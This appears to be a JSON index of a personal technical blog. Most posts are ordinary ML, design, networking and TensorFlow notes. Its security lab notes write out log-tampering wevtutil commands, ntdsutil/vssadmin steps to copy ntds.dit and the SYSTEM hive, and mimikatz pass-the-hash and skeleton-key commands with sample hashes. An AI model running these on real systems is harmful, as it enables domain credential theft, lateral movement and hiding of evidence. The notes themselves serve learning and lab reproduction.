    "content": "I will keep doing researches in adversarial machine learning, so I need to master the basci knowledge stuff. I want to use this blog to record the important and interesting things.Some repositories which can achieve useful information about how to learn Machine Learning or Tensorflow:  Virgilio  DeepLearning 500 question  TensorFlow Tutorials  Pytorch 60 mins Tutorial接下来，我将总结一下机器学习相关知识，并进行分析和反思。第一节主要根据《Machine Learning in Action》的内容，但是这书讲得太烂了，介绍算法混乱，定义不明确，代码过时并且意义不大，弃之。使用《统计学习方法》进行补充和继续。1. 分类1.1 基本概念首先，什么是机器学习？机器学习是把无序的数据转换成有用的信息。无序的数据主要分为两种：数值型（浮点数）、多值型（整数）。而机器学习的主要任务包括回归（预测数值型数据）和分类（将数据划分到合适类别）。两者皆属于监督学习，及需要知道任务的答案。而无监督学习是在没有类别信息或目标值的情况下通过数据本身进行聚类。接下来介绍一下机器学习的开发步骤：（1）收集数据：通过把前人公开或者自行爬取的数据进行归纳总结，得到最原始的数据库。（2）准备数据：根据机器学习的输入要求，把原始数据标准化以及数量化。（3）分析数据：分析当前获得的数据是否合理，是否存在数据平衡性或数据量不足的问题。（4）训练算法：挑选合适的机器学习算法或模型进行训练，并在训练过程中调整超参数。（5）分析结果：分析实验结果的真实性，反复调整超参数和模型提高准确率或效果。（6）可视化展示：通过图表或其他方式对实验结果进行分析展示。目前主要的机器学习开发语言是Python，此外还会涉及到Numpy, Scipy, Matplotlib, Pandas等库进行补充。1.2 KNN算法K临近算法（K-Nearest-Neighbor）是通过比较数据的特征值之间的距离进行分类。该算法的优点是对异常值不明感，缺点是时间复杂度和空间复杂度高。具体来说，通过把数据特征量化后，根据特征的差异定义距离，将距离最近的数据设置成同一类别的过程。KNN算法的伪代码如下：（1）计算已知类别数据集中的所有点与当前需要分类点之间的距离；（2）将所有点按距离远近从小到大排列；（3）选取与当前点距离最近的K个点；（4）确定这些点的类别，返回出现频率最高的点的类别作为预测结果；比较基础的距离计算公式是计算欧式距离，即初中学习的两点间距离公式的多维度展开，具体公式如下：\\[distance=\\sqrt{\\sum_{i=0}^{n}(a_i-b_i)^2}\\]显而易见，KNN算法并不一定能得到完全正确的预测结果，因此需要通过一些衡量标准来实现对算法效果的评估。一般来说，通过准确率可以较直观地了解分类器在某数据集上的效果，即准确率=分类正确个数/总个数。在处理特征的过程中，需要对数据进行归一化处理，其公式如下：\\[newValue = \\frac{oldValue-min}{max-min}\\]通过该公式可以把原本取值范围极大的特征映射到0到1之间。1.3 决策树决策树是通过针对数据的特征进行划分并最终完成对数据的分类的一种树形结构，由结点和有向边组成。结点包括内部结点（表示特征或属性）和叶结点（类）。在判断如何划分数据时，需要引进信息熵或者基尼不纯度(Gini Impurity)等概念。（1）信息熵，即信息的期望值。对于\\(x_i\\)的信息定义为：\\(l(x_i)=-log_{2}p(x_i)\\)。其中\\(p(x_i)\\)表示该分类的概率。那么所以类别可能值包含的信息期望值：\\(H=-\\sum_{i=1}^np(x_i)log_2p(x_i)\\)。因此，如果划分之后信息熵变大，则说明数据更加无序；相反如果熵值变低，则说明数据有序，分类合理。（2）基尼不纯度：通过对信息熵定义中的\\(log_2p(x_i)\\)泰勒展开舍弃高阶小量得到。因此可以把基尼不纯度看作是熵的近似值。\\[Gini(X)=\\sum_{x\\in\\chi}p(x)(1-p(x))\\]目前主流的决策树包括：ID3、C4.5、CART、随机森林等。1.4 朴素贝叶斯分类贝叶斯分类，即以贝叶斯定理为基础进行分类，而朴素贝叶斯份额里则是其中有代表性的一种算法。首先，概率论中通过贝叶斯法则可以计算条件概率。若要计算\\(c\\)在\\(x\\)情况下的概率，则可以使用如下公式：\\[\\large{P(c|x)=\\frac{p(x|c)p(c)}{p(x)}}\\]而朴素贝叶斯分类则是通过计算概率来进行分类。比如，在对文档进行分类时，\\(w\\)代表该文档的词向量，\\(c_i\\)表示把该文档归为\\(i\\)类，则公式为：\\[\\large{P(c_i|w)=\\frac{p(w|c_i)p(c_i)}{p(w)}}\\]其中\\(p(c_i)=\\frac{i类文档数量}{文档总数量}\\)；假设文档中所有词出现概率相互独立，根据朴素贝叶斯假设，通过如下公式来简化计算： \\(p(w\\vert c_i)=p(w_0,w_1,\\ldots ,w_n\\vert c_i)=p(w_0\\vert c_i)p(w_1\\vert c_i)\\ldots p(w_n\\vert c_i)\\)；由于只需要比较概率大小，所以\\(p(w)\\)无需计算。1.5 Logistic回归1.6 支持向量机(SVM)1.7 Adaboost元算法一些问题1. 反向传播2. 梯度消失3."
  },
  
  {
    "title": "Threat Hunting Tools Summary",
    "url": "/posts/Threat_Hunting_Tools_Summary/",
    "categories": "",
    "tags": "Security",
    "date": "2019-01-27 00:00:00 -0800",
    





    
    "snippet": "Recently I am working on searching the threat hunting tools and categoried them. So I writed the blog to save the detail about them.osquery-kolide/fleet/redis-mysqlJustnifferTools List:  Facebook o...",
    "content": "Recently I am working on searching the threat hunting tools and categoried them. So I writed the blog to save the detail about them.osquery-kolide/fleet/redis-mysqlJustnifferTools List:  Facebook osquery  Google GRR  [ELK]  GrayLog  Cyber Wardog Lab  Sysmon  Love  Bro IDSFacebook OsqueryThis is a tool to use sql to get the system information and to record other logs which is able to be used in Linux, Windows or Mac. The goal of osquery is to enable non-developers to access and aggregate data across the disparate sources and to deploy across corporate and production infrastructure.It has several plugins for deployment and development which is very useful for the information collection.Query packs is one of the function that help group to query the function.GRRGRR(Google Rapid Response) is a incident response framework focused on remote live forensics.GRR consists of 2 parts: client and server.ELKelasticSearchGrayLog"
  },
  
  {
    "title": "Adobe Illstrator self learning",
    "url": "/posts/Adobe-Illstrator/",
    "categories": "",
    "tags": "Design",
    "date": "2018-12-27 00:00:00 -0800",
    





    
    "snippet": "Adobe Illstrator is a software to design the web UI or the architecture layout. The reason I use it is to master a way to draw beautiful picture in papers. So I find a tutorial in the Youtube and r...",
    "content": "Adobe Illstrator is a software to design the web UI or the architecture layout. The reason I use it is to master a way to draw beautiful picture in papers. So I find a tutorial in the Youtube and record and summarize the basic knowledge and shortcut about AI.Tutorial Link1. Ten Basic ThingStart the new file from the templateThere are several templates we can use when building a new file. If we want to design a web UI we can choose the web navbar or we can click “More Settings” buttom to set the specific detail about the new file. We can set the profile as Custom and then set the artboard number and other things.And another tip is that we can set the artboard name at the bottom of the right side as we can see in the picture3 just like Sketch.Tools      Rectangle tool(Shortcut M) is used to create a rectangle.      - If we hold shift when we create the rectangle, it will be a square. And this tip is also suitable in creating ellipse and circle.     - If we click when using the rectangle tool, we can input the specific number of the width and height.     - We can use Object -&gt; Arrange to move the graph backward or forward.    Drwa a line:          Pen tool: hold shift to draw a perfectly straight line. Clike to get a line and drag to get a curve.      Line segment tool(): draw a line and hold shift to draw.      Pencil tool: draw strokes.            Blob brush tool and Painbrush tool: We can use some pattens in Brush Library to draw some specific lines.        Gradient tool: set gradient color in shapes. We can choose several colors and rotate the gradient.        Shape build tool: group or join in different shapes into one shape.        Free transform tool: change or distort the shape to some special form    Change pixel picture to vector."
  },
  
  {
    "title": "Windows Event Log",
    "url": "/posts/Windows_Event_Log/",
    "categories": "",
    "tags": "Security",
    "date": "2018-11-27 00:00:00 -0800",
    





    
    "snippet": "Windows Event Log default Path: %systemroot%\\system\\winevt\\Logs      Use commands to gain the event log    Wevtutil.exe: retrieve information about event logs and publishers. It can also be used to...",
    "content": "Windows Event Log default Path: %systemroot%\\system\\winevt\\Logs      Use commands to gain the event log    Wevtutil.exe: retrieve information about event logs and publishers. It can also be used to install and uninstall manifests.          Readwevtutil.exe qe Security /f:text /rd:true /c:10: gain the latest 10 rows in security event logs.      Exportwevtutil.exe epl Security 1.evtx: export the whole security event logs to 1.evtx      Export with modificationwevtutil epl Security 1.evtx \"/q:*[System [(EventRecordID!=1112)]]\" : exprot the security event logs to 1.evtx without evnet 1112            Several methods to replace the original logs with the modified one    Method 1: Unlock the original file    Method 2: Injection Loader Dll    Method 3: DuplicateHandle        The whole flow  Source of the whole cpp fileThe problem: how to run the cpp file in the windows without compiler"
  },
  
  {
    "title": "Windows Hash Achievement via VSS",
    "url": "/posts/Windows_Hash_Achievement_via_VSS/",
    "categories": "",
    "tags": "Security",
    "date": "2018-10-29 00:00:00 -0700",
    





    
    "snippet": "The blog introduces and summarizes several ways to get ntds.dit file by vss which is preinstalled in Windows and decrypt the file to get the hash which can be used in other attack. As a result, the...",
    "content": "The blog introduces and summarizes several ways to get ntds.dit file by vss which is preinstalled in Windows and decrypt the file to get the hash which can be used in other attack. As a result, the blog comprises two parts. I use the following two blogs by 3gstudent and ropnop for reference.Export the NTDS.dit via VSSVSS, the abbreviation of Volume Shadow Copy Service, is used to implement the manual or automatic backup copies even when they are in use. It contains a set of COM interfaces that implements a framework to allow volume backups to be performed while applications on a system continue to write to the volumes.Step 1: Acquire the ntds.ditMethod 1: ntdsutil  list snapshots: ntdsutil snapshot \"List All\" quit quit  create snapshot：ntdsutil snapshot \"activate instance ntds\" create quit quit  load the snapshot: ntdsutil snapshot \"mount {ef0cadb1-a0f0-46c2-a4de-d6faaef0e199}\" quit quit  copy ntds.dit: copy C:\\$SNAP_201810291848_VOLUMEC$\\windows\\NTDS\\ntds.dit c:\\ntds.dit  unload the snapshot: ntdsutil snapshot  \"unmount {ef0cadb1-a0f0-46c2-a4de-d6faaef0e199}\" quit quit  delete the snapshot: ntdsutil snapshot  \"delete {ef0cadb1-a0f0-46c2-a4de-d6faaef0e199}\" quit quitMethod 2: vssadminSupported by windows 2008 or later and Administrator privilege needed  search current existing shadow: vssadmin list shadows  create the shadow: vssadmin create shadow /for=c:  copy ntds.dit: copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\windows\\NTDS\\ntds.dit c:\\ntds.dit  delete the shadow: vssadmin delete shadows /for=c: /quietMethod 3: vshadowMethod 4: NinjaCopyStep 2: Decrypt the ntds.dit by system hive"
  },
  
  {
    "title": "Permeation Skills",
    "url": "/posts/Permeation_Skills/",
    "categories": "",
    "tags": "Security",
    "date": "2018-09-22 00:00:00 -0700",
    





    
    "snippet": "Basic Knowledge  Active Directory Domain Services is Microsoft’s Directory Server. It provides authentication and authorization mechanisms as well as a framework within which other related services...",
    "content": "Basic Knowledge  Active Directory Domain Services is Microsoft’s Directory Server. It provides authentication and authorization mechanisms as well as a framework within which other related services can be deployed (AD Certificate Services, AD Federated Services, etc).  COMLAN Information Collection      WMIC(Windows Management Instructure Commands): WMI provides users with information about the status of local or remote computer systems and supports. It contains aliases, verbs, switches, and commands.          net config workstation: Search for the local machine’s domain            nltest: NLTEST.EXE is a very powerful command-line utility that can be used to test Trust relationships and the state of Domain Controller replication in a Microsoft Windows NT Domain.  Password Acquirement  Brute Force Tools:          SMBCrack2(2005)      Hydra        Mimikatz: require the administrator privilegeKerberoast Attack  Kerberroast AttackMITMLLMNR/NBNS欺骗 + WPAD协议Tools: ResponderDomain Management Privilege Maintainning  Golden Ticket  Silver TicketTutorial: Start-up a active directory  run dcpromo  set password and other proceduresWindows Server 2008 组网技术与应用详解1. 活动目录域服务1.1 AD域服务AD域服务用于本地网络活动目标的管理，包含：  只读型域控制器 RODC  RMS(权限管理服务)  联合身份验证服务  轻型目录服务器  证书服务活动目录负责目录数据库（即C:\\windows\\ntds\\ntds.dit）的操作，方便用户找寻数据。活动目录存储在域控制器中。每个域有一个或多个域控制器（同一个域内每个控制器中的活动目录相同），分担工作和任务。域控制器管理所有网络访问。活动目录可以包含一个或多个域（域林）。1.2 结构1.2.1 逻辑结构：  域  组织单元：容器对象，局限于域的内部  域树：连续命名空间的层次结构  域林：不共享连续命名空间的域树组成1.2.2 物理结构  站点  域控制器：多主机复制，但仍需指定全局目录服务器1.2.3 额外域、子域与信任关系  额外域控制器：主域控制器的备份和辅助  信任关系：          可传递信任、                  快捷信任          林信任          领域信任                    非可传递信任      2. 用户与组策略2.1 用户与组管理  用户组          系统默认组      新组        组织单元  配置文件2.2 组策略和应用介于控制面板和注册表之间的修改系统、设置程序的工具。  组策略对象组件 GPO          组策略容器组件 GPC      组策略模板组件 GPT        客户端拓展组件 CSE  组策略编辑器组件 GPE  计算机策略和用户策略组件  组策略和本地策略组件3. DHCP服务与DNS服务3.1 概念动态主机分配协议，方便客户端批量自动获取IP地址，其租借过程如下：  客户端以0.0.0.0作为自己的IP地址，255.255.255.255作为DHCP服务器地址，广播DHCP发现信息，包含网卡Mac地址和NetBIOS名称。  每隔一段时间发送一次直到收到回复，或者自动选定保留IP地址段的一个，保证没有DHCP服务器网络仍能运行。  客户单收到第一个请求后以广播方式告知所有服务器。3.2 在服务器中，以IP作用域作为基本管理单位。IP作用域就是网络中可管理的IP地址分组。超级作用域是DHCP服务器上有多个作用域，用于多网配置。3.3 DHCP中继代理：将请求发送到远端的DHCP服务器上。3.4 域名系统，实现名称与IP地址的转换，主要包括：  DNS域命名空间  资源记录  服务器  客户端3.5 查询模式：递归查询、迭代查询、反向查询4. 文件服务与证书服务4.1 通过文件服务器，设置共享文件夹，并给予不同用户不同的权限。另外，可以使用资源管理器实现文件共享；通过脱机设置实现离线访问共享资源。4.2 资源访问权限的控制：NTFS。NTFS是从Windows NT开始引入的文件系统，可以为文件夹和文件授权，支持数据压缩和磁盘限额，但不适用与FAT或FAT32文件系统4.3 磁盘配额：以文件所有权为基础，只应用于卷并监视个人用户卷的使用情况。4.4 分布式文件系统 DFS：为所有共享文件提供访问点和逻辑树结构，保证服务稳定。  独立的根目录分布式文件系统：目录信息存储在本地主服务器上。没有根级别的容错，即根不可达则整个空间不可访问。  域分布式文件系统：拓扑信息存储在活动目录AD中。4.5 数字证书是由证书颁发机构（Certification Authority）数字签名的、包含用户身份信息和用户公钥信息以及身份验证机构数字签名的数据。  身份验证机构的数字签名确保信息真实性  用户公钥信息确保完整性  用户数字签名确保不可否认性注意：Windows 2008使用公共密钥基础结构（Public Key Infrastructure），即非对称加密技术。注意，部署了证书服务器后，服务器的计算机名和域名不能更改，但可以更改IP地址。5. 活动目录权限管理服务（AD Right Management Services）相关组件：应用程序、服务器、客户端5.1 权限管理账号证书生成过程：  用户第一次使用加密文档之前，需要域用户身份向AD RMS服务器发送请求，获取证书。  服务器数据库，若密钥已经存在则使用该密钥，否则新建。  服务器将用户密钥中私钥用服务器的私钥加密，并将公钥和加密了的私钥放到权限管理账户证书中。  权限管理账户证书被服务器用私钥签名，并发送给用户。  服务器将用户的密钥对存储到AD RMS数据库中。5.2 AD RMS实现原理5.1.1 服务的发现5.1.2 文档在线发布过程5.1.3 文档离线发布过程5.1.4 受保护文档使用过程服务器虚拟化（Hyper-V）与虚拟机不同，Hyper-V管理的虚拟机直接运行在底层，相当于独立的计算机。网络访问保护（Network Access Protection）检查联入内网的电脑是否安全，分为4个部分：  策略验证  隔离  补救  持续监控防火墙IPSec从Windows Server 2003开始使用，位于网络层，可以防止中间人攻击、探测攻击、重放攻击、未认证的网络应用程序访问、只适用IP地址认证的网络应用程序的访问。IPSec有两种模式：传输模式和通道模式。IPSec使用两种协议：AH和ESP。Internet密钥交换协议（IKE）：Internet安全关联和密钥管理协议（ISAKMP）和Oakley金钥交换协议的组合，分为3个模式：主模式、快速模式和用户模式。ATA[90 days free trial]The Advanced Threat Analytics is a platform to protect the system from cyber attacks. The informatino collected by ATA via:  Port mirroring from DC and DNS server to the ATA gateway  Deploy gateway on Domian ControllerATA receives events and log from:  SIEM intergration  Windows Event ForwardingATA detects suspicious activities:  Reconnaissance  Lateral movement cycle  Domain dominance (persistence)which including:  Pass-the-Ticket (PtT)  Pass-the-Hash (PtH)  Overpass-the-Hash  Forged PAC (MS14-068)  Golden Ticket  Malicious replications  Reconnaissance  Brute Force  Remote execution三好学生域渗透文章复现与总结1. 域渗透——获得域控服务器的NTDS.dit文件1.1 通过VSS服务下的命令获得域控服务器NTDS.dit文件Concepts：Volume Shadow Copy Service (Volume Snapshot Service) used in manual or automatic backup copies even when they are in use. It contains a set of COM interfaces that implements a framework to allow volume backups to be performed while applications on a system continue to write to the volumes.支持Windows 2003以上操作系统1.1.1 使用ntdsutil实现从snapshot中得到ntds.dit支持Windows 2003以上的系统  create snapshot：ntdsutil snapshot \"activate instance ntds\" create quit quit  load the snapshot: ntdsutil snapshot \"mount {ef0cadb1-a0f0-46c2-a4de-d6faaef0e199}\" quit quit  copy ntds.dit: copy C:\\$SNAP_201810291848_VOLUMEC$\\windows\\NTDS\\ntds.dit c:\\ntds.dit  unload the snapshot: ntdsutil snapshot  \"unmount {ef0cadb1-a0f0-46c2-a4de-d6faaef0e199}\" quit quit  delete the snapshot: ntdsutil snapshot  \"delete {ef0cadb1-a0f0-46c2-a4de-d6faaef0e199}\" quit quit注意：使用VSS服务会产生日志，ID为7036。create snapshot会产生日志ID为7036(实际测试时并未发现)。1.1.2 vssadmin支持windows 2008以上系统  search current existing shadow: vssadmin list shadows  create the shadow: vssadmin create shadow /for=c:  copy ntds.dit: copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\windows\\NTDS\\ntds.dit c:\\ntds.dit  delete the shadow: vssadmin delete shadows /for=c: /quiet1.1.3 vshadow.exe系统默认未安装，需要在Microsoft Windows Software Development Kit (SDK)中获取。vshadow.exe包含微软签名，能绕过某些白名单的限制。如果作为启动项，Autoruns的默认启动列表不显示。Tutorial1.1.4 vssown.vbs通过wmi对Shadowcopy进行控制，nishang里有powershell版本1.2 通过NinjaCopy获得域控服务器NTDS.dit文件powershell 运行脚本失败，语法错误，待研究。1.3 如何从NTDS.dit文件中获取关键信息1.3.1 获取各个用户的NTLM的hash值首先，需要利用system hive文件破解ntds.dit文件，使用注册表编辑器直接导出的reg文件无法用于破解，需要二进制格式的system hive文件。获取方法如下：  Step 1: 获取system hive文件          reg export HKLM\\System system.regreg save HKLM\\System system.hivThe first one can be opened using any text editor; the latter is a full binary dump, and can be opened by loading it in REGEDIT.            Step 2: 取得各个账号的hash值                  Method 1: 使用Impacket/secretsdump.py取得所有账户的hash值   $ python secretdump.py -ntds /root/ntds_cracking/ntds.dit -system /root/ntds_cracking/systemhive LOCAL                    Method 2: 使用esedbexport   /usr/local/bin/esedbexport -m tables ntds.dit              Step 3: 未完成破解hash值          hashcat kali虚拟机无法使用，似乎需要GPU      1.3.2: 使用ntdsxtract获取域名信息  Step 1： 安装  $ wget https://github.com/libyal/libesedb/releases/download/20170121/libesedb-experimental-20170121.tar.gz  $ tar xf libesedb-experimental-20170121.tar.gz  $ cd libesedb-20170121/  Step 2: 根据第一步得到的表格，通过dsuser.py脚本得到域名相关信息                                        dsusers.py ../test/ntds.dit.export/datatable.3 ../test/ntds.dit.export/link_table.5 output –syshive ../test/system.hiv –passwordhashes –pwdformat ocl –ntoutfile ntout –lmoutfile lmout            tee all_user_info.txt                              2. 域渗透——Pass The Hash的实现Principle: Attacker use latent NTLM hash instead of plaintext password to authenticate to a remote server.常用工具：2.1 Kali:\t- meterpreter\t- Tool: pass the hash2.2 windows\t- python: wmiexec\t- powershell: powershell\t\t- Invoke-WMIExec\t\t- Invoke-SMBExec\t\t- Invoke-SMBClient \t \t- mimikatz: 需要管理员权限\t\t- 使用pass the ticket不需要管理员权限，但需要另一个工具kekeo教程Step 1: 获取用户hash值，结果如下所示Administrator:500:aad3b435b51404eeaad3b435b51404ee:1dda962106ebf0bd4218bc4d0a78f0c9:::            Experiment Information                         Username      Administrator              Domain      test              NTLM      1dda962106ebf0bd4218bc4d0a78f0c9              AES256             Step 2： 使用mimikatz实现pass the hashMethod 1: 使用账户hash值，需要管理员权限，mimikatz \"privilege::debug\" \"sekurlsa::pth /user:Administrator /domain:test.com /ntlm:1dda962106ebf0bd4218bc4d0a78f0c9\"会弹出一个cmd，可以通过dir \\\\192.168.139.101\\c$实现查看Administrator的主目录，具体其他用法还需要研究。sekurlsa::pth /user:WORKER1 /domain:test.local /ntlm:2c24919527e360383d7c4cd6c7b0aab0Method 2: 使用AES_Hash值，适用于安装了KB2871997补丁的主机。[未实现]mimikatz: 通过sekurlsa::ekeys可以查看本机内存中的mimikatz \"privilege::debug\" \"sekurlsa::pth /user:Administrator /domain:test.com /aes256:aad4b3c9ed4b3f1ef04b5a69ff326c9bdc8c43214924fac1b96c88ad168891d3\" sekurlsa::pth /user:krbtgt /domain:test.local /aes256:159ee14fd120960a157b04dd92d1d4ba3debdf859834e76ea0d3f62cb4cf6ac1用mimikatz \"sekurlsa::ekeys\"，发现Administrator账户没有AES256值。待研究，似乎需要新建一个管理员权限，原本自带Administrator有安全问题需要禁用。dir \\\\DCServer\\c$copy sn.txt \\\\DCServer\\c$net use计算机管理-&gt;共享文件夹-&gt;共享域中各个账号的意义和权限AdministratorGuestkrbtgtDCServer3. 域渗透——Skeleton KeyStep 1: 尝试在域内主机与域服务器建立网络连接  net use \\\\DCServer.test.com Xjc123 /user:Administrator@test.comnet use \\\\DCServer.test.com Xjc123456 /user:Jason@test.comdir \\\\DCServer.test.com\\c$删除当前连接：net use * /del /yStep 2: 在DC中通过mimikatz实现安装skeleton key  privilege::debugmisc::skeletonmimikatz的默认Skeleton Key设置为mimikatzStep 3: 在域内主机通过skeleton key实现用任意账号登录DC测试发现，使用任意账号都能实现访问域控制器LSA保护【似乎在windows 2008没用】Step 1: 设置LSA保护注册表位置：HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa新建-DWORD值，名称为RunAsPPL,数值为000000013. 域渗透——Dump Clear-Text Password after KB2871997 installed4. 域渗透——Pass The Ticket漏洞：MS14-068工具：  PyKEK  kekeo  问题总结      Windows Server 建立域环境和DNS服务器后使用nslookup\t时显示DNS Server timed out:    解决方法:在DNS反向查找里新建区域，并新建指针，指向DNS服务器。        Windows Server 配置静态IP地址和DNS服务器时输入完默认DNS服务器IP地址会默认变成空：    解决方法：设置为自动获取IP地址，再重新设置为静态IP即可解决这个问题。        Windows Server 高级共享设置，无法启用网络发现：    解决方法： 先检查是否发生问题2中的情况，再检查是否启用服务：          Function Discovery Resource Publication      SSDP Discovery      UPnP Device Host            【终止，因为要钱】在安装ATA的过程中遇到的问题：                  在Windows 2008 R2 Enterprise中安装.Net Framework 4.6.1一直失败，找到解决问题的办法：来源        下载offline的.Net 4.6.1的安装包，用某种技巧提取exe中的msi文件，我使用7-zip软件提取，找到netfx_Full_x64文件即可完成安装绕过检查。                  Hashcat无法使用    clGetDeviceIDs(): CL_DEVICE_NOT_FOUND  clGetDeviceIDs(): CL_DEVICE_NOT_FOUND  No devices found/left."
  },
  
  {
    "title": "IP Command",
    "url": "/posts/IP_Command/",
    "categories": "",
    "tags": "Network",
    "date": "2018-08-09 00:00:00 -0700",
    





    
    "snippet": "Recently, I need to configure a bunch of switches to construct a leaf-spine network. And IP command is a good choice to do this software-base configuration. And how I summaried the ip command’s usa...",
    "content": "Recently, I need to configure a bunch of switches to construct a leaf-spine network. And IP command is a good choice to do this software-base configuration. And how I summaried the ip command’s usage bases on the document which is written by Alexey N. Kuznetsov.Use who command to list the users logining the same machine currently.Use service network restart or /etc/init.d/networking restart to restart the network module in Linux.1. OverviewIP command which is a utility from iproute2 package is used to configure the Linux network.The ip command syntax:ip [options] object [command [arguments]]Options( a set of optional modifiers affecting the general behaviour of the ip utility or changing its output ):  -V/Version  -s/statistics: use one time to output more information. use twice time to output more information.  -o/oneline: output record on a single lineObjects( the object to manage or to get information about ):  link: network device  address: IP or IPv6 address  neighbour: ARP or NDISC(Neighbor Discover Protocol for ipv6) cache entry  route: routing table entry  rule: rule in routing policy databse  maddress: multicast address  mroute: multicast routing cache entry  tunnel: tunnel over IPCommands: add/delete/show/helpArguments: flags and parameterserror messages  syntax error  argument verification  ip compilation failure  syscall error from kernel2. IP Link – network device configuration2.1 ip link setArguments:  dev NAME(default)  up/down  arp on/off  multicast on/off  dynamic on/off  name NAME  txqueuelen/txqlen NUMBER  mtu Number  address LLADDRESS  broadcast LLADDRESS2.2 ip link showArguments:  dev NAME(default)  up: display running interfaces2.2.1 An example of using ip link show on Ubuntu 2018 x86_64:\t1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN mode DEFAULT group default qlen 1000\t\tlink/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\t2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP mode DEFAULT group default qlen 1000\t\tlink/ether 00:0c:29:b9:bd:c8 brd ff:ff:ff:ff:ff:ffExplanation:  interface index: the number before the colon  interface name  interface flags:          UP: the device is turned on.      LOOPBACK: all packets will be returned but bounced packets.      BROADCAST: sent packets to all hosts sharing the same link.      POINTOPOINT      MULTICAST: a bigger type on Broacast        mtu: maximal transfer unit  qdisc: queuing discipline          noqueue: the interface does not queue anything      noop: blackhole model and discard anything      qlen: default ransmit queue length        link layer address and device mac address: second line’s information2.2.2 An example of using ip -s -s link ls ens33 ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP mode DEFAULT group default qlen 1000link/ether 00:0c:29:b9:bd:c8 brd ff:ff:ff:ff:ff:ffRX: bytes  packets  errors  dropped overrun mcast596509     3028     0       0       0       0RX errors: length   crc     frame   fifo    missed           0        0       0       0       0TX: bytes  packets  errors  dropped carrier collsns316030     2201     0       0       0       0TX errors: aborted  fifo   window heartbeat transns           0        0       0       0       4Explanation:  RX/TX: receiver and transmitter statistics  different type of bytes or packets3. IP Address – protocol address management3.1 ip address addArguments:  dev NAME  local ADDRESS(default)  broadcast ADDRESSExample:ip addr add 10.0.0.1/24 brd + dev eth0 label eth0:Alias: add the address 10.0.0.1 with prefix length 24 (i.e. netmask 255.255.255.0), standard broadcast and label eth0:Alias to the interface eth0.3.2 ip address deleteThis command coincides with the arguments of ip addr add.3.3 ip address showThis command shows the details of the ip address configuration.3.4 ip address flushdangerous, similiar to delete command4. IP NeighbourNeighour objects establish bindings between protocol addresses and link layer addresses for hosts sharing the same link. The IPv4 neighbour table is known as the ARP table.  ip neigh add/change/replace  ip neigh delete  ip neigh show  ip neigh flushExample:ip neigh add 10.0.0.3 lladdr 0:0:0:0:0:1 dev eth0 nud perm: add a permanent ARP entry for the neighbour 10.0.0.3 on the device eth0.5. IP Route – routing table managementRoute entries in the kernel routing tables keep information about paths to other networked nodes.All of the packets will obey the routes based on the prefix its ip address matches. If several routes match the packet, the longest matching prefix is selected.  ip route add/change/replace  ip route delete  ip route show  ip route flush  ip route getExample:ip route add 10.0.0/24 via 193.233.7.65: add a plain route to network 10.0.0/24 via gateway 193.233.7.65.6. Other CommandsIP Rule – routing policy database managementRules in the routing policy database control the route selection algorithm.  ip rule add/delete  ip rule showIP maddress – multicast addresses managementIP mroute – multicast routing cache managementIP tunnel – tunnel configurationError Record:      When the file interfaces does not work, the problem mostly is in the interfaces file’s content which contains some mistakes or lack in some tools. Once the file interfaces does not work although I restarted the network module. The problem is that I did not install ethtool which is used in interfaces file.    Ethtool is a useful utility used for Network Interface Card configuration. It is easy toconfigure the IP address, interface speed, interface duplex or half duplex.  "
  },
  
  {
    "title": "Tensorflow Learning",
    "url": "/posts/Tensorflow_Learning/",
    "categories": "",
    "tags": "Machine Learning",
    "date": "2018-08-03 00:00:00 -0700",
    





    
    "snippet": "1. Start UpThe aim of this chapter is to install IPython and tensorflow packages by Anaconda.      Installing Jupyter methods: There are two methods listing on the page, but the first one which use...",
    "content": "1. Start UpThe aim of this chapter is to install IPython and tensorflow packages by Anaconda.      Installing Jupyter methods: There are two methods listing on the page, but the first one which used Anaconda is recommanded because when you want to delete the whole things the pip way just sucks.    When you want to uninstall Jupyter, the conda way uses the following command easily: conda uninstall jupyter notebook. But the pip way needs to use pip list |grep Jupyter and then uninstall the result by hand.        Install Anaconda: Using the curl command is the fastest way to get the installer, or the installer is avaiable on the official website.    curl -O https://repo.continuum.io/archive/Anaconda3-5.2.0-Linux-x86_64.sh    You can check the installer by the sha256 with the sum on the official website:    sha256sum Anaconda3-5.2.0-Linux-x86_64.sh    Then run the script:    bash Anaconda3-5.2.0-Linux-x86_64.sh    Once the ouput shows the following information:     installation finished. Do you wish the installer to prepend the Anaconda3 install location to PATH in your /home/sammy/.bashrc ? [yes|no] [no] &gt;&gt;&gt;   Input `Yes` to use `conda` command everywhere. And activate the configuration with the following command:        source ~/.bashrc        Common usage of conda:     conda list # list the packages conda info -envs # list the environments conda create --name my_env python=3.6 # create an environment with python 3.6 source activate my_env # activate the environment source deactivate # deactivate conda remove --name my_env --all # delete the environment conda update conda/anaconda # update conda and anaconda distribution version conda install anaconda-clean # delete anaconda anaconda-clean rm -rf ~/anaconda3 # need to delete the path in ~/.bashrc as well            Install Jupyter:  After created the environment by the command:    conda create -n tensorflow pip python=2.7 # or python=3.6    activate the environment and then install Jupyter and TensorFlow. After that, you need to set the config for running a notebook server so you can just use your browser to control the Jupyter. The information is provided here. For me, the easiest way to configure it is like that:     $ jupyter notebook --generate-config $ vim ~/.jupyter/jupyter_notebook_config.py # delete the # before the following lines     c.NotebookApp.ip = '*'     c.NotebookApp.notebook_dir = '/home/User/jupyter'     c.NotebookApp.open_browser = True        After that, you can use &lt;IP address&gt;:8888 on your browser to connect the Jupyter.        Install Tensorflow(After activated the environment):    $ pip install --ignore-installed --upgrade tfBinaryURL    tfBinaryURL is available on the page. The following command may be needed to be updated.    pip install --ignore-installed --upgrade https://download.tensorflow.google.cn/linux/cpu/tensorflow-1.8.0-cp36-cp36m-linux_x86_64.whl        Now when you use jupyter notebook and new your first file try to import tensorflow, it is still not available. The reason is that the jupyter package is installed on conda dirctory but tensorflow is installed in your environment. So the method to solve the problem is to install the jupyter package in your environment and add the environment path to the .bashrc file.     ```shell  source activate my_env  pip install jupyter  vim ~/.bashrc        export PATH=”/home/user/anaconda3/bin:$PATH” # replace the line  export 